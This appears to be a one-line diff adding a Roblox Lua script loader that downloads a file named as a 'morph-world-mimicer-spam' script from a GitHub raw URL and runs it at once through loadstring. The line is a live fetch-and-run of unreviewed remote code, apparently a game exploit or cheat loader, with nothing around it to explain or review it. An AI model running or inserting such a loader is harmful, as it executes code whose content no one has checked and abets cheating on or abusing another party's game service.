@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/morph-world-mimicer-spam6-3krnmfpvijvewc.lua"))()
